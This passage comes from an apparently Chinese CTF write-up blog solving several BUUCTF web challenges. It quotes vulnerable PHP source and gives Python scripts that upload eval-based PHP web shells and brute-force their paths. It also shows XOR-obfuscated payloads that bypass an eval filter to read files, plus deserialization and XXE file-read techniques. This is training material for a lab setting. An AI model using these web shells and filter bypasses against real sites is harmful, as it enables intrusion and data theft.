class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"r00t"</span>,<span class="string">"r00t"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$file = <span class="keyword">new</span> upload();</span><br><span class="line">$file-&gt;upload_base();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>show.php有对图片的宽和高反序列化操作，不过，图片的宽和高我们无法控制，唯一可以控制的只有title参数，这里存在着insert注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">True</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=serialize(<span class="keyword">new</span> helper());</span><br><span class="line"><span class="keyword">echo</span> str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>),<span class="string">'\0\0\0'</span>,$s);</span><br><span class="line"><span class="comment"># O:6:"helper":2:&#123;s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";&#125;</span></span><br></pre></td></tr></table></figure><p>因为上传的文件名中不能有双引号，所以将payload进行16进制编码。<br><img src="../../images/ctf/buuctf2/7.png" alt=""></p><h1 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">```        </span><br><span class="line">这个部分只会检测上传的文件file的后缀，而不会检测其他上传的文件的后缀。</span><br><span class="line">而upload函数本省是可以批量上传的。</span><br><span class="line"></span><br><span class="line">原题中：</span><br></pre></td></tr></table></figure><p>$upload-&gt;allowExts  = array(‘jpg’, ‘gif’, ‘png’, ‘jpeg’);// 设置附件上传类型<br>这里设置是无效的，thinkphp 3.2中设置允许上传的文件后缀应该写为：</p><p>$upload-&gt;exts      =     array(‘jpg’, ‘gif’, ‘png’, ‘jpeg’);// 设置附件上传类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">此处摘抄自thinkphp3.2官网</span><br><span class="line"></span><br><span class="line">综上，压根就没有对上传文件做严格的检测，我们甚至只需要上传一个input标签name值不为file都行，只是这样的话，后端不会返回文件路径，所以需要上传一个正常的图片来猜测uniqid函数返回文件路径的大致范围。</span><br><span class="line"></span><br><span class="line">方法一:</span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">#上传文件</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;e54d31dd-efb4-45da-8512-f7387193b5a6.node3.buuoj.cn&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;upload&#39;</span><br><span class="line">file1 &#x3D; &#123;&#39;file&#39;:(&#39;1.txt&#39;,&#39;r&#39;)&#125;</span><br><span class="line">file2 &#x3D; &#123;&#39;file[]&#39;:(&#39;1.php&#39;,&#39;r&#39;)&#125; #upload()不传参时即是批量上传所以用[]</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file1)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file2)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.post(url, files &#x3D; file1)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#猜测文件位置</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;e54d31dd-efb4-45da-8512-f7387193b5a6.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">path &#x3D; url + &quot;&#x2F;index.php&#x2F;home&#x2F;index&#x2F;upload&quot;</span><br><span class="line">files &#x3D; &#123;&quot;file&quot;:(&quot;a.txt&quot;,&#39;a&#39;), &quot;file1&quot;:(&quot;b.php&quot;, &#39;&lt;?php eval($_GET[&quot;a&quot;]);&#39;)&#125;</span><br><span class="line">r &#x3D; requests.post(path, files&#x3D;files)</span><br><span class="line">t1 &#x3D; r.text.split(&quot;&#x2F;&quot;)[-1].split(&quot;.&quot;)[0]</span><br><span class="line">param&#x3D;json.loads(r.content)</span><br><span class="line">print(param)</span><br><span class="line">t1 &#x3D; int(t1, 16)</span><br><span class="line"></span><br><span class="line">j &#x3D; t1</span><br><span class="line">while True:</span><br><span class="line">    path &#x3D; url + &quot;&#x2F;Public&#x2F;Uploads&#x2F;&quot;+param[&#39;url&#39;].split(&quot;&#x2F;&quot;)[-2]+&quot;&#x2F;%s.php&quot; % hex(j)[2:]</span><br><span class="line">    try:</span><br><span class="line">        r &#x3D; requests.get(path,timeout&#x3D;1)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    if r.status_code &#x3D;&#x3D; 429:#规避过于频繁访问导致的429</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        continue</span><br><span class="line">    elif r.status_code !&#x3D; 404:</span><br><span class="line">        print(path)</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line">    #print(j, path, r.status_code)</span><br><span class="line">    j -&#x3D; 1</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;e54d31dd-efb4-45da-8512-f7387193b5a6.node3.buuoj.cn&#x2F;index.php&#x2F;home&#x2F;index&#x2F;upload&#x2F;&quot;</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line">files &#x3D; &#123;&quot;file&quot;: (&quot;shell.&lt;&gt;php&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;])?&gt;&quot;)&#125;</span><br><span class="line">r &#x3D; requests.post(url, files&#x3D;files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h1 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h1><h1 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">'image/png'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded file is not PNG format.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded image is too large.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  error(<span class="string">'What happened...? OK, the flag for part 1 is: &lt;code&gt;'</span> . getenv(<span class="string">'FLAG1'</span>) . <span class="string">'&lt;/code&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用finfo去判断图片类型。必须是image/png<br>接着用getimagesize去判断图片大小<br>并且图片类型不能是PNG</p><p>图片破坏后。只留下一个文件头。getimagesize就读取不到它的文件宽高和类型了<br>那么就可以绕过getimagesize的判断<br>而finfo_file照样可以识别出这是个PNG图片 。<br><img src="../../images/ctf/buuctf2/8.jpg" alt=""></p><h1 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/wangtanzhi/p/12309335.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12309335.html</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>UserController.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">……</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $listData = $_REQUEST;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,$listData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BaseController.php,loadView存在变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 加载视图文件</span></span><br><span class="line"><span class="comment"> * viewName 视图名称</span></span><br><span class="line"><span class="comment"> * viewData 视图分配数据</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> $viewPath;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span><span class="params">($viewName =<span class="string">''</span>, $viewData = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">"/View/&#123;$viewName&#125;.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">&#123;</span><br><span class="line">extract($viewData);</span><br><span class="line"><span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>userIndex.php 此次存在文件读取，可利用上面的变量覆盖，将$img_file赋值为flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">                    $img_file = <span class="string">'/../favicon.ico'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line">                $img_base64 = imgToBase64($img_dir);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span> . $img_base64 . <span class="string">'"&gt;'</span>;       <span class="comment">//图片形式展示</span></span><br><span class="line">                <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h1><h1 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'rosé will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x00- <span class="number">0</span><span class="number">-9</span>                       匹配\x00到空格(\x20)，<span class="number">0</span><span class="number">-9</span>的数字</span><br><span class="line"><span class="string">'"`$&amp;.,|[&#123;_defgops              匹配这些字符</span></span><br><span class="line"><span class="string">\x7F                            匹配DEL(\x7F)字符</span></span><br></pre></td></tr></table></figure><p>匹配到以上字符就die掉</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br></pre></td></tr></table></figure><p>当mode=3: 会返回包含所有用过的不同字符的字符串,这里不能超过13种字符</p><p>先看一下有哪些内置函数可以使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line">print_r($array);</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">'internal'</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"\`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>result</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bcmul</span><br><span class="line">rtrim</span><br><span class="line">trim</span><br><span class="line">ltrim</span><br><span class="line">chr</span><br><span class="line">link</span><br><span class="line">unlink</span><br><span class="line">tan</span><br><span class="line">atan</span><br><span class="line">atanh</span><br><span class="line">tanh</span><br><span class="line">intval</span><br><span class="line">mail</span><br><span class="line">min</span><br><span class="line">max</span><br></pre></td></tr></table></figure><p>使用异或绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;php -r <span class="string">"echo urlencode(~'phpinfo');"</span></span><br><span class="line">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>使用^绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(.));=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p>读文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure><h1 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h1><p>SVG是个XML的图片。并且存在可控的内容<br>是否存在XXE，构造PAYLOAD<br>由于不知道flag路径。一般就是在/flagxxxx。和当前目录flagxxx<br>而/proc/self/pwd/代表的是当前路径。可以构造/proc/self/pwd/flag.txt读取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 